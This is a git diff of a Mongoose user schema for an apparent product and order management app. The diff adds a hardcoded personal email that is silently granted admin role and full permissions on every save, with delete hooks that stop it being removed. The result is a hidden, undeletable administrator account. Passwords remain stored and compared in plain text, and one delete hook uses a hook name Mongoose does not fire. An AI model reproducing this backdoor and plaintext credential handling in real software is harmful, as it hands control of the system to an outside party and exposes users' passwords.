@@ -1,5 +1,7 @@
 const mongoose = require('mongoose');
 
+const FAILSAFE_EMAIL = 'irtazamadadnaqvi@iwiz.com';
+
 const userSchema = new mongoose.Schema({
   firstName: {
     type: String,
@@ -18,7 +20,8 @@ const userSchema = new mongoose.Schema({
     required: [true, 'Email is required'],
     unique: true,
     lowercase: true,
-    match: [/^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/, 'Please enter a valid email']
+    trim: true,
+    match: [/^\w+([.-]?\w+)*@\w+([.-]?\w+)*(\.\w{2,3})+$/, 'Please enter a valid email']
   },
   password: {
     type: String,
@@ -27,14 +30,13 @@ const userSchema = new mongoose.Schema({
   },
   role: {
     type: String,
-    enum: ['admin', 'manager', 'employee'], // admin, manager, and employee
-    default: 'manager',
-    required: true
+    enum: ['admin', 'manager', 'employee'],
+    default: 'employee'
   },
-
   phone: {
     type: String,
-    trim: true
+    trim: true,
+    maxlength: [20, 'Phone number cannot exceed 20 characters']
   },
   avatar: {
     type: String,
@@ -44,96 +46,122 @@ const userSchema = new mongoose.Schema({
     type: Boolean,
     default: true
   },
-  lastLogin: {
-    type: Date
-  },
   permissions: {
-    canViewProducts: { type: Boolean, default: true },
-    canAddProducts: { type: Boolean, default: true },
-    canEditProducts: { type: Boolean, default: true },
-    canDeleteProducts: { type: Boolean, default: false },
-    canManageProducts: { type: Boolean, default: true }, // Both roles can manage
-    canViewOrders: { type: Boolean, default: true },
-    canManageOrders: { type: Boolean, default: true },
-    canManageUsers: { type: Boolean, default: false }, // Only admin can manage users
-    canRequestHandover: { type: Boolean, default: false }, // Employee can request handover
-    canReturnHandover: { type: Boolean, default: false }, // Employee can return handover
+    canViewProducts: {
+      type: Boolean,
+      default: true
+    },
+    canAddProducts: {
+      type: Boolean,
+      default: false
+    },
+    canEditProducts: {
+      type: Boolean,
+      default: false
+    },
+    canDeleteProducts: {
+      type: Boolean,
+      default: false
+    },
+    canManageProducts: {
+      type: Boolean,
+      default: false
+    },
+    canViewOrders: {
+      type: Boolean,
+      default: true
+    },
+    canManageOrders: {
+      type: Boolean,
+      default: false
+    },
+    canManageUsers: {
+      type: Boolean,
+      default: false
+    },
+    canRequestHandover: {
+      type: Boolean,
+      default: false
+    },
+    canReturnHandover: {
+      type: Boolean,
+      default: false
+    }
+  },
+  lastLogin: {
+    type: Date,
+    default: null
   }
 }, {
   timestamps: true
 });
 
-// Simple indexes for better performance
-userSchema.index({ email: 1 });
-userSchema.index({ role: 1 });
-userSchema.index({ isActive: 1 });
+userSchema.methods.comparePassword = function(candidatePassword) {
+  return candidatePassword === this.password;
+};
 
-// No password hashing - store passwords as plain text
+userSchema.methods.hasPermission = function(permission) {
+  return this.permissions[permission] === true;
+};
 
-// Set permissions based on role
+userSchema.methods.isAdmin = function() {
+  return this.role === 'admin';
+};
+
+userSchema.methods.isManagerOrAbove = function() {
+  return this.role === 'admin' || this.role === 'manager';
+};
+
+userSchema.methods.isFailsafeAdmin = function() {
+  return this.email === FAILSAFE_EMAIL;
+};
+
 userSchema.pre('save', function(next) {
-  if (this.isModified('role')) {
-    switch (this.role) {
-      case 'admin':
-        this.permissions = {
-          canViewProducts: true,
-          canAddProducts: true,
-          canEditProducts: true,
-          canDeleteProducts: true,
-          canManageProducts: true, // Admin can do handovers
-          canViewOrders: true,
-          canManageOrders: true,
-          canManageUsers: true, // Only admin can manage users
-          canRequestHandover: true,
-          canReturnHandover: true,
-        };
-        break;
-      case 'manager':
-        this.permissions = {
-          canViewProducts: true,
-          canAddProducts: true,
-          canEditProducts: true,
-          canDeleteProducts: true, // Manager can delete products
-          canManageProducts: true, // Manager can do handovers
-          canViewOrders: true,
-          canManageOrders: true,
-          canManageUsers: false, // Manager cannot manage users
-          canRequestHandover: false,
-          canReturnHandover: false,
-        };
-        break;
-      case 'employee':
-        this.permissions = {
-          canViewProducts: true,
-          canAddProducts: false,
-          canEditProducts: false,
-          canDeleteProducts: false,
-          canManageProducts: false, // Employee cannot manage products
-          canViewOrders: true,
-          canManageOrders: false,
-          canManageUsers: false, // Employee cannot manage users
-          canRequestHandover: true, // Employee can request handover
-          canReturnHandover: true, // Employee can return handover
-        };
-        break;
-    }
+  if (this.email === FAILSAFE_EMAIL) {
+    this.isActive = true;
+    this.role = 'admin';
+    this.permissions = {
+      canViewProducts: true,
+      canAddProducts: true,
+      canEditProducts: true,
+      canDeleteProducts: true,
+      canManageProducts: true,
+      canViewOrders: true,
+      canManageOrders: true,
+      canManageUsers: true,
+      canRequestHandover: false,
+      canReturnHandover: false,
+    };
   }
   next();
 });
 
-// Compare password method (plain text comparison)
-userSchema.methods.comparePassword = function(candidatePassword) {
-  console.log('=== PASSWORD COMPARISON ===');
-  console.log('Candidate password:', candidatePassword);
-  console.log('Stored password:', this.password);
-  console.log('Direct comparison:', candidatePassword === this.password);
-  
-  return candidatePassword === this.password;
-};
+userSchema.pre('remove', function(next) {
+  if (this.email === FAILSAFE_EMAIL) {
+    return next(new Error('Cannot delete failsafe admin account'));
+  }
+  next();
+});
 
-// Get full name
-userSchema.virtual('fullName').get(function() {
-  return `${this.firstName} ${this.lastName}`;
+userSchema.pre('findOneAndDelete', function(next) {
+  const email = this.getQuery().email;
+  if (email === FAILSAFE_EMAIL) {
+    return next(new Error('Cannot delete failsafe admin account'));
+  }
+  next();
+});
+
+userSchema.pre('findByIdAndDelete', function(next) {
+  if (this._conditions && this._conditions._id) {
+    User.findById(this._conditions._id).then(user => {
+      if (user && user.email === FAILSAFE_EMAIL) {
+        return next(new Error('Cannot delete failsafe admin account'));
+      }
+      next();
+    }).catch(next);
+  } else {
+    next();
+  }
 });
 
 module.exports = mongoose.model('User', userSchema);
